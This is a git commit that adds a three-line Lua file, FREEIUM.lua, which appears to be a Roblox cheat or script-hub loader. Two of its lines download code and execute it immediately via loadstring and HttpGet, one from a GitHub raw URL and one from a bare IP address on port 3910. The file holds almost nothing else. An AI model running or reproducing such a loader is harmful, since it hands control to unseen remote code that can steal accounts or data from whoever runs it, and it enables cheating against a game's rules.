9ead19a66ec9523a0aeca4312b320a8bd6c5a8bd
ScriptDevs <elonmaskwife@gmail.com>
2025-08-24 16:28:38 +0800

    Create FREEIUM.lua

---
+++ FREEIUM.lua
@@ -0,0 +1,3 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/ZusumeHub/ZusumeHub/refs/heads/main/UpdateZysume"))()
+ID="311c86f8-b442-42d8-a381-3c9473b1f92a";
+loadstring(game:HttpGet("http://5.129.235.74:3910/cdn/loader.luau"))()
